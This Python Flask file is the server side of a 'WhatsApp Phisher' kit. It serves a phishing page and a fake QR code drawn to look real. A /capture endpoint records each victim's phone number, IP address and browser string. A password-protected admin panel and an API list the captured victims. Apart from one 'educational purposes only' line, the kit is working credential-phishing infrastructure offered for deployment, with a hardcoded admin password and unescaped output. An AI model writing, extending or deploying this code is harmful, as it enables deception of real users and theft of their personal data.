from flask import Flask, render_template, request, jsonify, send_file
import os
import json
from datetime import datetime
import base64
from io import BytesIO
import random
import string

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-2026'

# Configuration
VICTIMS_FILE = 'victims.json'
ADMIN_PASSWORD = 'admin123'  # CHANGE THIS AFTER DEPLOY!

# Ensure victims file exists
if not os.path.exists(VICTIMS_FILE):
    with open(VICTIMS_FILE, 'w') as f:
        json.dump([], f)

# Function to generate a simple QR-like image (base64)
def generate_qr_base64():
    """Generate a fake QR code image (since we can't use qrcode library on Render)"""
    # Create a simple black and white pattern that looks like a QR code
    size = 300
    cells = 25
    cell_size = size // cells
    
    # Create a simple grid pattern
    import PIL.Image
    import PIL.ImageDraw
    
    img = PIL.Image.new('RGB', (size, size), 'white')
    draw = PIL.ImageDraw.Draw(img)
    
    # Draw position markers (like real QR code)
    # Top-left marker
    for x in range(0, 7):
        for y in range(0, 7):
            if (x == 0 or x == 6 or y == 0 or y == 6 or 
                (1 <= x <= 5 and 1 <= y <= 5 and (x == 1 or x == 5 or y == 1 or y == 5))):
                draw.rectangle([x*cell_size, y*cell_size, (x+1)*cell_size, (y+1)*cell_size], fill='black')
    
    # Top-right marker
    for x in range(cells-7, cells):
        for y in range(0, 7):
            if (x == cells-7 or x == cells-1 or y == 0 or y == 6 or 
                (cells-6 <= x <= cells-2 and 1 <= y <= 5 and (x == cells-6 or x == cells-2 or y == 1 or y == 5))):
                draw.rectangle([x*cell_size, y*cell_size, (x+1)*cell_size, (y+1)*cell_size], fill='black')
    
    # Bottom-left marker
    for x in range(0, 7):
        for y in range(cells-7, cells):
            if (x == 0 or x == 6 or y == cells-7 or y == cells-1 or 
                (1 <= x <= 5 and cells-6 <= y <= cells-2 and (x == 1 or x == 5 or y == cells-6 or y == cells-2))):
                draw.rectangle([x*cell_size, y*cell_size, (x+1)*cell_size, (y+1)*cell_size], fill='black')
    
    # Add random dots to make it look like a real QR
    for i in range(200):
        x = random.randint(0, cells-1)
        y = random.randint(0, cells-1)
        if random.random() > 0.5:
            draw.rectangle([x*cell_size, y*cell_size, (x+1)*cell_size, (y+1)*cell_size], fill='black')
    
    # Convert to base64
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    img_base64 = base64.b64encode(buffer.getvalue()).decode()
    
    return img_base64

# Store current QR
current_qr = generate_qr_base64()

@app.route('/')
def index():
    """Serve the phishing page"""
    return render_template('index.html')

@app.route('/qr_code')
def get_qr_code():
    """Serve QR code as base64 image"""
    global current_qr
    return f"data:image/png;base64,{current_qr}"

@app.route('/refresh_qr')
def refresh_qr():
    """Generate new QR code"""
    global current_qr
    current_qr = generate_qr_base64()
    return jsonify({'status': 'ok', 'qr': current_qr})

@app.route('/capture', methods=['POST'])
def capture_data():
    """Capture victim phone number"""
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        
        # Load existing victims
        with open(VICTIMS_FILE, 'r') as f:
            victims = json.load(f)
        
        # Add new victim
        victim = {
            'id': len(victims) + 1,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'phone': phone,
            'ip': ip,
            'user_agent': user_agent[:100]  # Truncate
        }
        victims.append(victim)
        
        # Save back
        with open(VICTIMS_FILE, 'w') as f:
            json.dump(victims, f, indent=2)
        
        print(f"[!] VICTIM CAPTURED: {phone} from {ip}")
        
        return jsonify({'status': 'success'})
    
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin')
def admin_panel():
    """Admin panel to view victims"""
    password = request.args.get('password', '')
    
    if password != ADMIN_PASSWORD:
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title></head>
        <body style="font-family: Arial; background: #111; color: #0f0; text-align: center; padding: 50px;">
            <h1>Admin Panel</h1>
            <form method="get">
                <input type="password" name="password" placeholder="Enter password" 
                       style="padding: 10px; font-size: 16px; width: 300px;">
                <button type="submit" style="padding: 10px 20px;">Login</button>
            </form>
        </body>
        </html>
        """
    
    try:
        with open(VICTIMS_FILE, 'r') as f:
            victims = json.load(f)
    except:
        victims = []
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel - WhatsApp Phisher</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; }}
            h1 {{ color: #00ff00; }}
            table {{ border-collapse: collapse; width: 100%; background: #1a1a1a; }}
            th, td {{ border: 1px solid #00ff00; padding: 12px; text-align: left; }}
            th {{ background: #2a2a2a; color: #00ff00; }}
            td {{ color: #ccc; }}
            .stats {{ background: #1a1a1a; padding: 15px; margin-bottom: 20px; border-radius: 10px; border-left: 4px solid #00ff00; }}
            .count {{ font-size: 32px; color: #00ff00; font-weight: bold; }}
        </style>
    </head>
    <body>
        <h1>📱 WhatsApp Phisher - Admin Panel</h1>
        <div class="stats">
            <strong>Total Victims Captured:</strong> <span class="count">{len(victims)}</span>
        </div>
        
        <h2>Captured Data:</h2>
        <table>
            <tr>
                <th>ID</th>
                <th>Timestamp</th>
                <th>Phone Number</th>
                <th>IP Address</th>
                <th>User Agent</th>
            </tr>
    """
    
    for v in victims[::-1]:  # Show newest first
        html += f"""
            <tr>
                <td>{v.get('id', '-')}</td>
                <td>{v.get('timestamp', '-')}</td>
                <td><strong style="color:#00ff00">{v.get('phone', '-')}</strong></td>
                <td>{v.get('ip', '-')}</td>
                <td style="font-size:12px">{v.get('user_agent', '-')[:60]}...</td>
            </tr>
        """
    
    html += """
        </table>
        <br>
        <p style="color:#888;">⚠️ This panel is for educational purposes only.</p>
    </body>
    </html>
    """
    
    return html

@app.route('/api/victims')
def api_victims():
    """API endpoint for victims data"""
    password = request.args.get('password', '')
    
    if password != ADMIN_PASSWORD:
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        with open(VICTIMS_FILE, 'r') as f:
            victims = json.load(f)
        return jsonify(victims)
    except:
        return jsonify([])

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)